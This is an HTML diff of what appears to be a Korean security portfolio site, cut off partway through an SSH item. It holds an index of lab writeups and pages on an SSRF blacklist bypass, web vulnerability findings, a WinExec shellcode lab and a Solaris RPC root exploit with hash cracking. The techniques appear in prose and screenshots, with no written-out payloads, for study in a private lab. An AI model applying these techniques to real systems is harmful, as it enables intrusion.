+          <p style="margin-top:12px">현상→증거→원인→목표 지표→개선안→재검증 계획을 연결한 분석입니다. 위 표의 NLI 추가 전후(오탐 15→7, 미탐 5→8)는 전체 평가 결과이며, 이 이메일 사례의 개별 개선 실적으로 연결하지 않습니다. 보고서의 개선 제안과 실제 재측정 결과는 구분하며, 개선안의 적용·재측정은 근거가 있을 때만 완료로 적습니다.</p>
+        </div></div>
+      </div>
+      <div style="margin-top:28px;display:flex;gap:10px;flex-wrap:wrap"><a class="btn" href="#projects">← 프로젝트 리스트</a><a class="btn" href="#home">홈</a></div>
+    </div>
+  </section>
+</div>
+
+<!-- ===================== WRITEUPS INDEX ===================== -->
+<div class="view" id="view-writeups" hidden>
+  <section>
+    <div class="wrap">
+      <nav class="crumb" aria-label="위치"><a href="#home">홈</a><span class="sep">/</span><span>실습·분석</span></nav>
+      <h1 class="dtitle" tabindex="-1">실습·분석 전체 목록</h1>
+      <p class="dsum">공부·실습 기록에서 개별 항목을 찾을 수 있게 분야별로 정리했습니다. 각 항목은 제목·한 줄 관찰·실습 유형과 본문 링크를 가지며, 제목을 누르면 해당 본문으로 바로 이동합니다. 대표 진단 보고서는 <a href="#cases" style="color:var(--fg)">진단 리스트</a>에 있습니다.</p>
+      <div class="toc" role="group" aria-label="분야 바로가기" style="margin-top:18px">
+        <button data-to="c-web">웹 진단</button><button data-to="c-sys">시스템·리버싱</button><button data-to="c-net">네트워크·관제</button><button data-to="c-for">침해사고·포렌식</button><button data-to="c-mal">악성코드</button><button data-to="c-ai">AI 보안</button>
+      </div>
+
+      <div class="subhead" id="c-web">웹 진단</div>
+      <div class="rowlist">
+        <a class="row" href="#ssrf"><span class="rdom">대표</span><span class="rt"><b>SSRF 문자열 필터 우회</b><span>입력 문자열 검사와 서버 목적지 해석의 불일치로 블랙리스트를 통과. 필터 통과·내부 응답까지 확인.</span></span><span class="rgo">읽기 →</span></a>
+        <a class="row" href="#dvwa"><span class="rdom">보고서</span><span class="rt"><b>DVWA SQL Injection — 취약 코드 분석과 조치</b><span>취약 코드 확인 → 바인딩 적용 → ZAP 재스캔 경고 미표시. 진단 리스트의 대표 보고서.</span></span><span class="rgo">읽기 →</span></a>
+        <a class="row" href="#sqli"><span class="rdom">SQLi</span><span class="rt"><b>SQL Injection — DB 구조 식별</b><span>도구로 DB·테이블 구조를 식별. 필요한 범위만 공개.</span></span><span class="rgo">읽기 →</span></a>
+        <a class="row" href="#xss"><span class="rdom">XSS</span><span class="rt"><b>저장형 XSS</b><span>게시판 본문에 스크립트 저장 → 열람 시 실행 관찰.</span></span><span class="rgo">읽기 →</span></a>
+        <a class="row" href="#csrf"><span class="rdom">CSRF</span><span class="rt"><b>CSRF 댓글 작성 요청</b><span>자동 요청으로 댓글 작성 흐름 확인. 다른 세션 권한 영향은 별도 검증.</span></span><span class="rgo">읽기 →</span></a>
+        <a class="row" href="#upload"><span class="rdom">UPLOAD</span><span class="rt"><b>악성 파일 업로드</b><span>확장자 필터 우회 업로드 후 서버 응답 확인.</span></span><span class="rgo">읽기 →</span></a>
+        <a class="row" href="#filedl"><span class="rdom">PATH</span><span class="rt"><b>파일 다운로드 — 경로 조작</b><span>파라미터 경로 조작 요청·응답을 한 항목에서 확인.</span></span><span class="rgo">읽기 →</span></a>
+        <a class="row" href="#dirindex"><span class="rdom">EXPOSURE</span><span class="rt"><b>디렉터리 인덱싱</b><span>경로 접근 시 파일 목록·백업 파일 노출.</span></span><span class="rgo">읽기 →</span></a>
+        <a class="row" href="#adminexpose"><span class="rdom">EXPOSURE</span><span class="rt"><b>관리자 페이지 노출</b><span>유추 가능한 URL로 관리자 로그인 노출(인증 우회와 구분).</span></span><span class="rgo">읽기 →</span></a>
+        <a class="row" href="#wordpress"><span class="rdom">보고서</span><span class="rt"><b>WordPress 플러그인 취약점 연계 실습</b><span>사설망 공개 PoC 조정으로 접근·권한 상승·데이터·탐지 단계 확인.</span></span><span class="rgo">읽기 →</span></a>
+      </div>
+
+      <div class="subhead" id="c-sys">시스템 · 리버싱</div>
+      <div class="rowlist">
+        <a class="row" href="#bof"><span class="rdom">대표</span><span class="rt"><b>스택과 셸코드를 따라 메모장 실행</b><span>WinExec 셸코드 구성·실행까지. DEP·ASLR 우회는 별도 검증.</span></span><span class="rgo">읽기 →</span></a>
+        <a class="row" href="#calc"><span class="rdom">리버싱</span><span class="rt"><b>Calc.exe 어셈블리 해석</b><span>어셈블리에서 C 로직을 복원하고 연산을 바꾸는 패치를 관찰.</span></span><span class="rgo">읽기 →</span></a>
+        <a class="row" href="#rpc"><span class="rdom">CVE-1999-0209</span><span class="rt"><b>RPC 원격 → root · 해시 크랙</b><span>Solaris RPC 취약점 재현으로 root 셸, 추출 해시 크랙(값 마스킹).</span></span><span class="rgo">읽기 →</span></a>
+        <a class="row" href="#nmap"><span class="rdom">정찰</span><span class="rt"><b>nmap 포트 스캐닝</b><span>사설 실습망의 호스트·서비스를 식별.</span></span><span class="rgo">읽기 →</span></a>
+        <a class="row" href="#ssploit"><span class="rdom">정찰</span><span class="rt"><b>Searchsploit 취약점 검색</b><span>서비스 버전과 공개 취약점을 대조.</span></span><span class="rgo">읽기 →</span></a>
+        <a class="row" href="#ssh"><span class="rdom">SYSTEM</span><span class="rt"><b>SSH Bruteforce (Solaris)</b><span>실습망 SSH 접속 관찰. 일부 계정 확인·root 불가 범위.</span></span><span class="rgo">읽기 →</span></a>
+        <a class="row" href="#cve3623"><span class="rdom">CVE-2017-3623</span><span class="rt"><b>CVE-2017-3623 (Solaris)</b><span>원문에서 영향 제품·실습 범위를 확인해 요약.</span></span><span class="rgo">읽기 →</span></a>
+        <a class="row" href="#tcpclose"><span class="rdom">TCP</span><span class="rt"><b>TCP 연결 종료 실습</b><span>Seq/Ack 확인 후 변조 RST로 연결 종료. 세션 탈취 확인은 아님.</span></span><span class="rgo">읽기 →</span></a>
+        <a class="row" href="#sshtunnel"><span class="rdom">과제</span><span class="rt"><b>SSH 터널링 과제</b><span>로컬 포트 포워딩으로 접근 경로를 구성한 학습 기록.</span></span><span class="rgo">읽기 →</span></a>
+        <a class="row" href="#lindiag"><span class="rdom">진단</span><span class="rt"><b>리눅스·윈도우 취약점 진단 수업</b><span>U-04 등 진단 셸 코드. 제공 예제와 작성 범위를 구분.</span></span><span class="rgo">읽기 →</span></a>
+        <a class="row" href="#openedr"><span class="rdom">소스 분석</span><span class="rt"><b>OpenEDR 소스 분석</b><span>커널 콜백·레지스트리·미니필터·서비스 흐름 메모. miniEDR 설계 배경.</span></span><span class="rgo">읽기 →</span></a>
+      </div>
+
+      <div class="subhead" id="c-net">네트워크 · 관제</div>
+      <div class="rowlist">
+        <a class="row" href="#pfsense"><span class="rdom">관제</span><span class="rt"><b>pfSense 구성·정책</b><span>WAN/LAN 인터페이스와 방화벽 규칙을 직접 구성한 장비 실습.</span></span><span class="rgo">읽기 →</span></a>
+        <a class="row" href="#elastic"><span class="rdom">관제</span><span class="rt"><b>Elastic Stack 수집 구성</b><span>Suricata 이벤트가 Filebeat·Logstash를 거쳐 수집되는 구성.</span></span><span class="rgo">읽기 →</span></a>
+        <a class="row" href="#packet"><span class="rdom">패킷</span><span class="rt"><b>패킷 분석 — ARP·FTP·DDoS</b><span>프로토콜별로 공격 트래픽을 구분해 분석.</span></span><span class="rgo">읽기 →</span></a>
+        <a class="row" href="#nitroba"><span class="rdom">과제</span><span class="rt"><b>nitroba 패킷 분석 과제</b><span>HTTP 캡처에서 단서를 찾는 과정. 인물 식별 정보는 공개본에서 가림.</span></span><span class="rgo">읽기 →</span></a>
+      </div>
+
+      <div class="subhead" id="c-for">침해사고 · 포렌식</div>
+      <div class="rowlist">
+        <a class="row" href="#dbd"><span class="rdom">침해분석</span><span class="rt"><b>DBD 침해 분석 1·2</b><span>브라우저 캐시·웹 로그의 시간·IP·파일 단서를 두 단계로 연결.</span></span><span class="rgo">읽기 →</span></a>
+        <a class="row" href="#deface"><span class="rdom">침해분석</span><span class="rt"><b>Deface 침해 분석</b><span>변조 흔적과 타임라인 정리. 첨부 보고서는 강의 제공 자료로 출처 표기.</span></span><span class="rgo">읽기 →</span></a>
+        <a class="row" href="#ftk"><span class="rdom">포렌식</span><span class="rt"><b>FTK 분석 실습</b><span>파일시스템 아티팩트 추출과 시간 정보 대조.</span></span><span class="rgo">읽기 →</span></a>
+        <a class="row" href="#driveby"><span class="rdom">침해분석</span><span class="rt"><b>드라이브-바이 실습</b><span>브라우저 교육 시나리오 기록. DBD 증거 분석과 연결.</span></span><span class="rgo">읽기 →</span></a>
+        <a class="row" href="#cuckoo"><span class="rdom">환경 구축</span><span class="rt"><b>Cuckoo 샌드박스 구축</b><span>분석용 VM·스냅샷·도구 연동과 구축 중 문제 해결.</span></span><span class="rgo">읽기 →</span></a>
+        <a class="row" href="#hyper"><span class="rdom">환경 구축</span><span class="rt"><b>하이퍼바이저·분석 환경</b><span>VM·분석 환경 구축에서 직접 설정한 범위를 정리.</span></span><span class="rgo">읽기 →</span></a>
+        <a class="row" href="#recon"><span class="rdom">IR 수집</span><span class="rt"><b>IR 아티팩트 수집 (Windows·Linux)</b><span>침해 대응용 시스템 아티팩트 자동 수집 스크립트 실행·산출물 확인.</span></span><span class="rgo">읽기 →</span></a>
+      </div>
+
+      <div class="subhead" id="c-mal">악성코드</div>
+      <div class="rowlist">
+        <a class="row" href="#m518"><span class="rdom">대표</span><span class="rt"><b>518.exe 정적·동적 분석</b><span>DIE·Autoruns·Regshot을 교차해 Run 키 자동실행을 판단.</span></span><span class="rgo">읽기 →</span></a>
+        <a class="row" href="#beast"><span class="rdom">RAT</span><span class="rt"><b>BeastDoor</b><span>프로세스 트리와 실제 파일·API 결과를 구분한 분석.</span></span><span class="rgo">읽기 →</span></a>
+        <a class="row" href="#clickfix"><span class="rdom">메모리</span><span class="rt"><b>ClickFix 메모리 포렌식</b><span>Volatility로 문자열·인젝션·C2·지속성을 연결.</span></span><span class="rgo">읽기 →</span></a>
+        <a class="row" href="#wanna"><span class="rdom">랜섬</span><span class="rt"><b>WannaCry 침해 분석</b><span>FTK·레지스트리·캐시·서비스 관찰.</span></span><span class="rgo">읽기 →</span></a>
+        <a class="row" href="#htear"><span class="rdom">랜섬</span><span class="rt"><b>HiddenTear</b><span>AES 키 전송 구조와 복호화 파일 복원(키 마스킹).</span></span><span class="rgo">읽기 →</span></a>
+        <a class="row" href="#remcos"><span class="rdom">RAT</span><span class="rt"><b>Remcos</b><span>짧은 원문에서 직접 확인한 난독화 명령 일부를 관찰 노트로.</span></span><span class="rgo">읽기 →</span></a>
+        <a class="row" href="#orcus"><span class="rdom">RAT</span><span class="rt"><b>Orcus</b><span>교육 환경에서 확인한 구성·실행 기록을 행위 관찰 중심으로.</span></span><span class="rgo">읽기 →</span></a>
+        <a class="row" href="#badusb"><span class="rdom">장치</span><span class="rt"><b>BadUSB</b><span>Arduino 장치 실습의 관찰·방어 관점과 작업 범위.</span></span><span class="rgo">읽기 →</span></a>
+        <a class="row" href="#banker"><span class="rdom">Banker</span><span class="rt"><b>Banker 분석</b><span>이미지 기반 기록에서 확인된 동작을 중심으로 정리.</span></span><span class="rgo">읽기 →</span></a>
+        <a class="row" href="#installlmp"><span class="rdom">드로퍼</span><span class="rt"><b>Install_LiveManagerPlayer.exe</b><span>드로퍼 구성·IDA 함수·hosts/레지스트리·Sysmon/Procmon 관찰.</span></span><span class="rgo">읽기 →</span></a>
+        <a class="row" href="#livemanager"><span class="rdom">RAT</span><span class="rt"><b>LiveManagerPlayer</b><span>구성·실행 기록. Install 분석과 겹치는 부분을 대조.</span></span><span class="rgo">읽기 →</span></a>
+      </div>
+
+      <div class="subhead" id="c-ai">AI 보안</div>
+      <div class="rowlist">
+        <a class="row" href="#myora"><span class="rdom">프로젝트</span><span class="rt"><b>묘라 — 개인정보 탐지·AI 가드레일 평가</b><span>입·출력 가드레일과 오탐·미탐 분석. 묘라 프로젝트 상세로 연결.</span></span><span class="rgo">읽기 →</span></a>
+      </div>
+
+      <p class="wupnote">* 노션 ‘별도 실습’ 28건과 과제·수업의 실습 기록을 개별 항목으로 대조했습니다. 캡처가 있는 항목은 본문에 증거를 싣고, 짧은 항목은 원문에서 직접 확인한 관찰을 2~3문장으로 먼저 실었습니다. 공개 파일의 자격증명·개인정보는 가렸습니다.</p>
+      <div style="margin-top:22px"><a class="btn" href="#home">← 홈으로</a></div>
+    </div>
+  </section>
+</div>
+
+<!-- ===================== SSRF ===================== -->
+<div class="view" id="view-ssrf" hidden>
+  <section>
+    <div class="wrap">
+      <nav class="crumb" aria-label="위치"><a href="#home">홈</a><span class="sep">/</span><a href="#writeups">실습·분석</a><span class="sep">/</span><span>SSRF</span></nav>
+      <h1 class="dtitle" tabindex="-1">SSRF 문자열 필터 우회</h1>
+      <p class="dsum">주소를 문자열로 받아 서버가 대신 요청하는 기능에서, 블랙리스트 문자열 차단을 루프백의 다른 표기로 우회했습니다. 근본 원인은 애플리케이션 문자열 파서와 실제 소켓 주소 해석의 불일치입니다.</p>
+      <div class="status"><span class="chip"><span class="dot"></span>교육 실습 · Burp</span><span class="chip ok"><span class="dot"></span>필터 통과 · 실습 FLAG 응답</span></div>
+      <div class="meta">
+        <div class="m"><div class="mk">수행 유형</div><div class="mv">교육 실습</div></div>
+        <div class="m"><div class="mk">도구</div><div class="mv">Burp Suite</div></div>
+        <div class="m"><div class="mk">관찰 범위</div><div class="mv">필터 통과 · 내부 응답</div></div>
+        <div class="m"><div class="mk">본인 역할</div><div class="mv">요청 설계 · 재현</div></div>
+      </div>
+      <div class="report">
+        <div class="rsec"><h3><span class="n">01</span> 입력 문자열 검사 단계 — 차단 확인</h3><div class="rbody">
+          <p>먼저 애플리케이션이 <b>입력 문자열을 패턴으로 검사</b>하는 지점을 확인했습니다. 루프백·사설 대역 문자열을 넣으면 "허용되지 않는 주소"로 403 차단됩니다. 캡처(아래)에서는 차단 문구와 403 응답까지 확인했습니다.</p>
+          <figure class="fig" style="max-width:640px"><button class="zoom" aria-label="확대: 403 차단"><img src="assets/img/webdiag-27.webp" alt="localhost 문자열 입력에 대한 403 Forbidden 차단 응답" loading="lazy"></button><figcaption>입력 문자열 검사 — 403 Forbidden 차단</figcaption></figure>
+        </div></div>
+        <div class="rsec"><h3><span class="n">02</span> 목적지 해석 단계 — 우회 요청 · 응답</h3><div class="rbody">
+          <p>반면 서버가 <b>실제 목적지를 해석(소켓 연결)</b>하는 단계는 문자열 검사와 분리돼 있습니다. 그래서 같은 주소를 정수형 등 다른 표기로 넣으면 문자열 검사만 통과하고 목적지는 동일하게 해석됩니다. 왼쪽 캡처(webdiag-28)에서는 우회 요청과 내부 실습 응답(FLAG)까지, 오른쪽(webdiag-29)에서는 실습 환경의 성공 판정까지 확인했습니다. 관찰 범위는 필터 통과와 내부 실습 응답이며, 실제 DB 인증·조회 여부는 단정하지 않습니다.</p>
+          <div class="figrow two">
+            <figure class="fig"><button class="zoom" aria-label="확대: 우회 요청"><img src="assets/img/webdiag-28.webp" alt="다른 주소 표기 요청과 FLAG 응답" loading="lazy"></button><figcaption>우회 요청 → FLAG 응답</figcaption></figure>
+            <figure class="fig"><button class="zoom" aria-label="확대: 성공 판정"><img src="assets/img/webdiag-29.webp" alt="실습 FLAG 제출 성공 판정" loading="lazy"></button><figcaption>실습 성공 판정</figcaption></figure>
+          </div>
+        </div></div>
+        <div class="rsec"><h3><span class="n">03</span> 근본 원인 · 대응안</h3><div class="rbody">
+          <p>허용·차단을 문자열로 판단해 같은 목적지의 다른 표기를 걸러내지 못한 것이 원인입니다. 대응안은 주소를 정규화·IP로 해석해 사설/루프백 대역을 차단하고 DNS 리바인딩까지 고려하는 것이며, 실제 적용 여부와는 구분합니다.</p>
+        </div></div>
+      </div>
+      <div style="margin-top:28px;display:flex;gap:10px;flex-wrap:wrap"><a class="btn" href="#writeups">← 실습·분석 목록</a><a class="btn" href="#home">홈</a></div>
+    </div>
+  </section>
+</div>
+
+<!-- ===================== WEB DIAGNOSIS ===================== -->
+<div class="view" id="view-web" hidden>
+  <section>
+    <div class="wrap">
+      <nav class="crumb" aria-label="위치"><a href="#home">홈</a><span class="sep">/</span><a href="#writeups">실습·분석</a><span class="sep">/</span><span>웹 진단 실무</span></nav>
+      <h1 class="dtitle" tabindex="-1">웹 취약점 진단 실무 — 다중 항목</h1>
+      <p class="dsum">진단 실습 사이트를 수동 점검으로 돌며 발견한 항목을 가이드 양식으로 정리했습니다. SQL 오류 관찰과 인증 우회, 브라우저 표시와 서버 영향을 각각 구분해 기재합니다.</p>
+      <div class="meta">
+        <div class="m"><div class="mk">수행 유형</div><div class="mv">교육 실습</div></div>
+        <div class="m"><div class="mk">도구</div><div class="mv">Burp · 개발자도구</div></div>
+        <div class="m"><div class="mk">방식</div><div class="mv">수동 점검</div></div>
+        <div class="m"><div class="mk">본인 역할</div><div class="mv">점검 · 정리</div></div>
+      </div>
+      <p class="wuplede" style="margin-top:18px">아래 항목은 목록에서 바로 이동할 수 있도록 각각 고유 위치를 가집니다. SQL 오류 관찰과 인증 우회, 본인 브라우저에서 응답을 수정한 것과 다른 사용자에게 영향을 준 것을 각각 구분해 기재합니다.</p>
+
+      <article class="wuitem" id="it-sqli">
+        <div class="wuih"><span class="ft">SQLi</span><h3>SQL Injection — DB 구조 식별</h3><a class="anchor" href="#sqli">#sqli</a></div>
+        <p>입력값이 쿼리에 그대로 들어가는 지점을 찾아, 오류 메시지와 도구 응답으로 DB·테이블 구조를 식별했습니다. 화면에서 확인한 범위는 구조 열람까지이며, 추출한 값 중 민감한 부분은 공개본에서 가렸습니다.</p>
+        <figure class="fig"><button class="zoom" aria-label="확대: SQLi"><img src="assets/img/webdiag-01.webp" alt="데이터베이스 테이블 목록" loading="lazy"></button><figcaption>도구 응답으로 확인한 테이블 목록</figcaption></figure>
+      </article>
+      <article class="wuitem" id="it-xss">
+        <div class="wuih"><span class="ft">XSS</span><h3>저장형 XSS</h3><a class="anchor" href="#xss">#xss</a></div>
+        <p>게시판 본문 입력에 스크립트를 저장한 뒤, 다른 화면에서 글을 열람할 때 저장된 스크립트가 실행되는 것을 관찰했습니다. 실행 범위는 실습 계정의 브라우저이며, 세션 탈취 등 추가 영향은 확인 범위에 포함하지 않았습니다.</p>
+        <figure class="fig"><button class="zoom" aria-label="확대: XSS"><img src="assets/img/webdiag-02.webp" alt="저장형 XSS 실행" loading="lazy"></button><figcaption>열람 시 저장 스크립트 실행</figcaption></figure>
+      </article>
+      <article class="wuitem" id="it-csrf">
+        <div class="wuih"><span class="ft">CSRF</span><h3>CSRF 댓글 작성 요청</h3><a class="anchor" href="#csrf">#csrf</a></div>
+        <p>로그인 세션이 있는 상태에서 외부 요청만으로 댓글 작성 흐름이 처리되는 것을 확인했습니다. 토큰 검증이 없는 요청이 그대로 수행되는 범위까지 보았고, 다른 세션 권한에 대한 영향은 별도 검증으로 둡니다.</p>
+        <figure class="fig"><button class="zoom" aria-label="확대: CSRF"><img src="assets/img/webdiag-07.webp" alt="CSRF 댓글 작성" loading="lazy"></button><figcaption>자동 요청에 의한 댓글 작성</figcaption></figure>
+      </article>
+      <article class="wuitem" id="it-upload">
+        <div class="wuih"><span class="ft">UPLOAD</span><h3>악성 파일 업로드</h3><a class="anchor" href="#upload">#upload</a></div>
+        <p>업로드 검증의 확장자 필터를 우회해 파일을 올리고 서버 응답을 확인했습니다. 화면에서 본 범위는 업로드 성공 응답까지이며, 업로드한 파일의 실행·웹쉘 연계는 시스템 실습의 웹쉘 항목과 구분합니다.</p>
+        <figure class="fig"><button class="zoom" aria-label="확대: 업로드"><img src="assets/img/webdiag-34.webp" alt="확장자 우회 업로드 응답" loading="lazy"></button><figcaption>확장자 우회 업로드 응답</figcaption></figure>
+      </article>
+      <article class="wuitem" id="it-filedl">
+        <div class="wuih"><span class="ft">PATH</span><h3>파일 다운로드 — 경로 조작</h3><a class="anchor" href="#filedl">#filedl</a></div>
+        <p>다운로드 파라미터의 경로를 조작해 의도하지 않은 경로의 파일에 접근하는 요청과 그 응답을 한 항목에서 확인했습니다. 요청에 대한 응답이 돌아오는 범위까지 관찰했습니다.</p>
+        <div class="figrow two">
+          <figure class="fig"><button class="zoom" aria-label="확대: 다운로드 요청"><img src="assets/img/webrep-21.webp" alt="경로 조작 다운로드 요청" loading="lazy"></button><figcaption>경로 조작 요청</figcaption></figure>
+          <figure class="fig"><button class="zoom" aria-label="확대: 다운로드 응답"><img src="assets/img/webrep-47.webp" alt="파일 다운로드 응답" loading="lazy"></button><figcaption>다운로드 응답</figcaption></figure>
+        </div>
+      </article>
+      <article class="wuitem" id="it-dirindex">
+        <div class="wuih"><span class="ft">EXPOSURE</span><h3>디렉터리 인덱싱</h3><a class="anchor" href="#dirindex">#dirindex</a></div>
+        <p>디렉터리 리스팅이 열린 경로에 접근해 파일 목록과 백업 파일이 그대로 노출되는 것을 확인했습니다. 노출 자체를 관찰한 범위이며, 노출된 파일의 민감 내용은 공개본에 싣지 않았습니다.</p>
+        <figure class="fig"><button class="zoom" aria-label="확대: 인덱싱"><img src="assets/img/webrep-02.webp" alt="디렉터리 인덱싱" loading="lazy"></button><figcaption>디렉터리 인덱싱 노출</figcaption></figure>
+      </article>
+      <article class="wuitem" id="it-adminexpose">
+        <div class="wuih"><span class="ft">EXPOSURE</span><h3>관리자 페이지 노출</h3><a class="anchor" href="#adminexpose">#adminexpose</a></div>
+        <p>유추 가능한 URL로 관리자 로그인 화면이 외부에 노출되는 것을 확인했습니다. 이 항목은 화면 노출까지의 관찰이며, 인증 우회나 관리자 권한 취득으로 집계하지 않습니다.</p>
+        <figure class="fig"><button class="zoom" aria-label="확대: 관리자"><img src="assets/img/webrep-25.webp" alt="관리자 로그인 노출" loading="lazy"></button><figcaption>관리자 로그인 화면 노출</figcaption></figure>
+      </article>
+      <p class="wupnote">* 응답 표시 관찰 등 보조 캡처(webrep-32)는 서버 측 영향과 구분하기 위해 본문 설명으로만 다루고, 개별 항목으로는 분리하지 않았습니다. DVWA SQL Injection 보고서와 WordPress 연계 실습은 <a href="#cases" style="color:var(--fg)">진단 리스트</a>의 대표 보고서로 유지합니다.</p>
+      <div style="margin-top:22px;display:flex;gap:10px;flex-wrap:wrap"><a class="btn" href="#writeups">← 실습·분석 목록</a><a class="btn" href="#home">홈</a></div>
+    </div>
+  </section>
+</div>
+
+<!-- ===================== BOF ===================== -->
+<div class="view" id="view-bof" hidden>
+  <section>
+    <div class="wrap">
+      <nav class="crumb" aria-label="위치"><a href="#home">홈</a><span class="sep">/</span><a href="#writeups">실습·분석</a><span class="sep">/</span><span>BOF</span></nav>
+      <h1 class="dtitle" tabindex="-1">스택과 셸코드를 따라 메모장 실행까지</h1>
+      <p class="dsum">실행 환경과 대상 바이너리에서 확인한 스택·호출 흐름을 따라 WinExec 셸코드를 구성하고, 실습에서 실제 메모장을 실행했습니다. DEP·ASLR 우회와 일반적인 익스플로잇 성립은 별도 검증으로 둡니다.</p>
+      <div class="meta">
+        <div class="m"><div class="mk">수행 유형</div><div class="mv">교육 실습</div></div>
+        <div class="m"><div class="mk">환경</div><div class="mv">Win32 · OllyDbg</div></div>
+        <div class="m"><div class="mk">확인 범위</div><div class="mv">스택 · 호출 흐름 · 실행</div></div>
+        <div class="m"><div class="mk">별도 검증</div><div class="mv">DEP·ASLR 우회</div></div>
+      </div>
+      <div class="report" style="margin-top:8px">
+        <div class="rsec"><h3><span class="n">01</span> 셸코드 구성</h3><div class="rbody">
+          <p>"note"/"pad" 문자열을 리틀엔디언 바이트로 바꿔 스택에 쌓고, <code class="inl">kernel32.WinExec</code> 주소를 호출하도록 셸코드를 구성했습니다. 캡처에서는 스택에 값이 올라간 상태까지 확인했습니다.</p>
+          <figure class="fig" style="max-width:720px"><button class="zoom" aria-label="확대: 스택 구성"><img src="assets/img/bof-00.webp" alt="스택에 셸코드가 올라간 디버거 화면" loading="lazy"></button><figcaption>스택에 셸코드 구성</figcaption></figure>
+        </div></div>
+        <div class="rsec"><h3><span class="n">02</span> 호출 흐름 관찰</h3><div class="rbody">
+          <p>디버거에서 명령을 한 줄씩 실행하며 레지스터·스택 변화를 따라갔습니다. 캡처는 WinExec 호출 직전의 스택 상태로, 인자 배치와 호출 지점까지 확인한 범위입니다.</p>
+          <figure class="fig" style="max-width:720px"><button class="zoom" aria-label="확대: 호출 직전"><img src="assets/img/bof-01.webp" alt="WinExec 호출 직전 스택 상태" loading="lazy"></button><figcaption>WinExec 호출 직전 스택</figcaption></figure>
+        </div></div>
+        <div class="rsec"><h3><span class="n">03</span> 실행 결과</h3><div class="rbody">
+          <p>셸코드 실행 결과 실제 메모장 프로세스가 떴습니다. 이 실습에서 확인한 범위는 셸코드 실행에 의한 메모장 실행까지이며, 보호기법(DEP·ASLR) 우회나 취약 입력을 통한 일반적인 제어 흐름 획득은 별도 검증으로 둡니다.</p>
+          <figure class="fig" style="max-width:720px"><button class="zoom" aria-label="확대: 메모장 실행"><img src="assets/img/bof-02.webp" alt="셸코드 실행으로 메모장이 실행된 결과" loading="lazy"></button><figcaption>메모장 실행 결과</figcaption></figure>
+        </div></div>
+      </div>
+      <div style="margin-top:26px;display:flex;gap:10px;flex-wrap:wrap"><a class="btn" href="#writeups">← 실습·분석 목록</a><a class="btn" href="#home">홈</a></div>
+    </div>
+  </section>
+</div>
+
+<!-- ===================== SYSTEM ===================== -->
+<div class="view" id="view-system" hidden>
+  <section>
+    <div class="wrap">
+      <nav class="crumb" aria-label="위치"><a href="#home">홈</a><span class="sep">/</span><a href="#writeups">실습·분석</a><span class="sep">/</span><span>시스템 침투</span></nav>
+      <h1 class="dtitle" tabindex="-1">시스템 침투·권한 상승 실습</h1>
+      <p class="dsum">사설망 대상의 알려진 취약점 재현과 연계 실습입니다. 각 단계의 실제 출력으로 결과를 확인했고, 신규 취약점 발견이 아니라 공개 취약점 재현·연계 학습으로 설명합니다. 비밀값은 공개본에서 가렸습니다.</p>
+      <div class="meta">
+        <div class="m"><div class="mk">수행 유형</div><div class="mv">교육 실습(사설망)</div></div>
+        <div class="m"><div class="mk">도구</div><div class="mv">Metasploit · John · hping3</div></div>
+        <div class="m"><div class="mk">성격</div><div class="mv">공개 취약점 재현·연계</div></div>
+        <div class="m"><div class="mk">공개 처리</div><div class="mv">비밀값 마스킹</div></div>
+      </div>
+      <p class="wuplede" style="margin-top:18px">각 항목은 목록에서 바로 이동할 수 있도록 고유 위치를 가집니다. 캡처가 있는 항목은 실제 출력을 근거로, 짧은 항목은 실습에서 직접 확인한 관찰을 중심으로 정리했습니다.</p>
+
+      <article class="wuitem" id="it-calc">
+        <div class="wuih"><span class="ft">리버싱</span><h3>Calc.exe 어셈블리 해석</h3><a class="anchor" href="#calc">#calc</a></div>
+        <p>디스어셈블된 코드를 따라가며 어떤 연산을 수행하는지 C 수준 로직으로 복원하고, 특정 분기나 연산 상수를 바꾸면 결과가 어떻게 달라지는지 확인했습니다. 확인한 범위는 연산 흐름 해석과 값 변경 관찰까지입니다.</p>
+        <figure class="fig"><button class="zoom" aria-label="확대: Calc 리버싱"><img src="assets/img/calc-03.webp" alt="Calc.exe 디스어셈블리 분석 화면" loading="lazy"></button><figcaption>어셈블리에서 복원한 연산 흐름</figcaption></figure>
+      </article>
+      <article class="wuitem" id="it-rpc">
+        <div class="wuih"><span class="ft">CVE-1999-0209</span><h3>RPC 원격 → root · 해시 크랙</h3><a class="anchor" href="#rpc">#rpc</a></div>
+        <p>사설 실습망의 Solaris RPC 취약점을 공개 모듈로 재현해 root 셸까지 확인하고, 추출한 해시를 크랙 도구로 평문까지 복원했습니다. 신규 취약점 발견이 아니라 공개 취약점 재현이며, 해시·평문 등 비밀값은 공개본에서 실제 픽셀로 가렸습니다.</p>
+        <div class="figrow two">
+          <figure class="fig"><button class="zoom" aria-label="확대: RPC root"><img src="assets/img/rpc-07.webp" alt="RPC 취약점 root 셸" loading="lazy"></button><figcaption>RPC 재현으로 획득한 root 셸</figcaption></figure>
+          <figure class="fig"><button class="zoom" aria-label="확대: 해시 크랙"><img src="assets/img/rpc-08.webp" alt="해시 크랙 결과, 비밀값 마스킹" loading="lazy"></button><figcaption>해시 크랙(값 마스킹)</figcaption></figure>
+        </div>
+      </article>
+      <article class="wuitem" id="it-nmap">
+        <div class="wuih"><span class="ft">정찰</span><h3>nmap 포트 스캐닝</h3><a class="anchor" href="#nmap">#nmap</a></div>
+        <p>실습망 Solaris 대상(192.168.56.102)에 포트·서비스·버전 스캔을 수행해 열린 포트와 서비스(FTP·SSH·Telnet·RPC 계열 등)를 식별했습니다. 이 결과를 다음 단계의 취약점 검색과 연결하는 정찰 기록이며, 대상은 교육용 사설망으로 한정했습니다.</p>
+        <figure class="fig"><button class="zoom" aria-label="확대: nmap 스캔"><img src="assets/img/nmap-00.webp" alt="Solaris 대상 nmap 포트·서비스 스캔 결과" loading="lazy"></button><figcaption>nmap 포트·서비스 스캔 결과</figcaption></figure>
+      </article>
+      <article class="wuitem" id="it-ssploit">
+        <div class="wuih"><span class="ft">정찰</span><h3>Searchsploit 취약점 검색</h3><a class="anchor" href="#ssploit">#ssploit</a></div>
+        <p>스캔으로 확인한 서비스(Telnet 등)를 Searchsploit으로 공개 취약점 DB에서 검색해 재현 후보를 대조했습니다. 화면은 Solaris Telnet 관련 공개 취약점 목록으로, 버전과 공개 취약점을 연결하는 과정을 정리한 기록입니다.</p>
+        <figure class="fig"><button class="zoom" aria-label="확대: Searchsploit"><img src="assets/img/ssploit-00.webp" alt="searchsploit telnet 검색으로 나온 Solaris 공개 취약점 목록" loading="lazy"></button><figcaption>Searchsploit 공개 취약점 검색 결과</figcaption></figure>
+      </article>
+      <article class="wuitem" id="it-ssh">
